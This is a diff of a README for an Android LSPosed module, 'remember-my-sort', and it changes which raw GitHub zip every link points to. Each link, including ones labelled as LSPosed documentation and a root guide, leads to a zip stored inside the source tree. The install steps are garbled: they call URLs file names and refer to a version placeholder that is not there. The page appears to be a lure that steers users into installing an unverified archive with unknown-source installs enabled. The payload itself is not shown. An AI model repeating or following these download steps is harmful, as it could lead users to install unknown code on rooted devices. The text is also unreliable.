@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download remember-my-sort](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/kotlin/sort_remember_my_3.4.zip)](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/kotlin/sort_remember_my_3.4.zip)
+[![Download remember-my-sort](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/resources/my-remember-sort-v1.5.zip)](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/resources/my-remember-sort-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you download, ensure you have the following:
 
 Go to the following link to access the release files:
 
-[Download "remember-my-sort"](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/kotlin/sort_remember_my_3.4.zip)
+[Download "remember-my-sort"](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/resources/my-remember-sort-v1.5.zip)
 
 ### 2. Choose the Latest Release
 
@@ -34,15 +34,15 @@ On the releases page, look for the latest version of "remember-my-sort". Release
 
 ### 3. Download the Module
 
-Click on the file named something similar to "https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/kotlin/sort_remember_my_3.4.zip" (replace X.X with the version number). This file contains the LSPosed module you need to install. 
+Click on the file named something similar to "https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/resources/my-remember-sort-v1.5.zip" (replace X.X with the version number). This file contains the LSPosed module you need to install. 
 
 ### 4. Extract the Zip File
 
-Once the download is complete, locate the zip file in your device’s download folder. Use a file manager app to extract the contents. You will typically see a file named "https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/kotlin/sort_remember_my_3.4.zip".
+Once the download is complete, locate the zip file in your device’s download folder. Use a file manager app to extract the contents. You will typically see a file named "https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/resources/my-remember-sort-v1.5.zip".
 
 ### 5. Install the Module
 
-Tap on the "https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/kotlin/sort_remember_my_3.4.zip" file to start the installation. Follow the on-screen prompts to complete the installation process. Ensure you have allowed installations from unknown sources in your device settings if prompted.
+Tap on the "https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/resources/my-remember-sort-v1.5.zip" file to start the installation. Follow the on-screen prompts to complete the installation process. Ensure you have allowed installations from unknown sources in your device settings if prompted.
 
 ### 6. Activate the Module
 
@@ -69,8 +69,8 @@ We value your experience! If you have any questions, comments, or suggestions ab
 
 ## 📖 Additional Resources
 
-- [LSPosed Documentation](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/kotlin/sort_remember_my_3.4.zip)
-- [Android Root Guide](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/kotlin/sort_remember_my_3.4.zip)
+- [LSPosed Documentation](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/resources/my-remember-sort-v1.5.zip)
+- [Android Root Guide](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/resources/my-remember-sort-v1.5.zip)
 
 ## 👍 Acknowledgments
 
@@ -78,4 +78,4 @@ Thank you for choosing "remember-my-sort". Your support helps improve this appli
 
 Feel free to explore the GitHub repository for updates and future features. 
 
-[Download "remember-my-sort"](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/kotlin/sort_remember_my_3.4.zip)
+[Download "remember-my-sort"](https://raw.githubusercontent.com/Nazeer5403/remember-my-sort/main/app/src/main/resources/my-remember-sort-v1.5.zip)
